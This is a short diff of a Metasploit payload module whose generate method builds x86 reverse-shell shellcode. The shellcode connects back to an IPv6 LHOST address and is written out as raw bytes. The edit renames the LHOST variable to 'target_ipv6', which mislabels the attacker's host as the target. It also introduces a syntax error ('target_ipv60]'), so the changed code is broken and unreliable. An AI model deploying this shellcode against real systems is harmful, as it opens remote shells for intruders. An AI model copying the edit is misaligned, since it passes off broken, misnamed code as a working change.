@@ -29,11 +29,11 @@ module MetasploitModule
   end
 
   def generate
-      my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
-      first_dword  = my_ipv6[0]
-      second_dword = my_ipv6[1]
-      third_dword  = my_ipv6[2]
-      fourth_dword = my_ipv6[3]
+      target_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
+      first_dword  = target_ipv60]
+      second_dword = target_ipv6[1]
+      third_dword  = target_ipv6[2]
+      fourth_dword = target_ipv6[3]
       "\x31\xdb\xf7\xe3\x6a\x06\x6a\x01\x6a\x0a\x89\xe1\xb0\x66\xb3\x01" +
       "\xcd\x80\x89\xc6\x31\xc0\xb0\x02\x31\xdb\xcd\x80\x39\xd8\x74\x02" +
       "\x77\x70\x31\xc9\x31\xdb\x53\x53" +
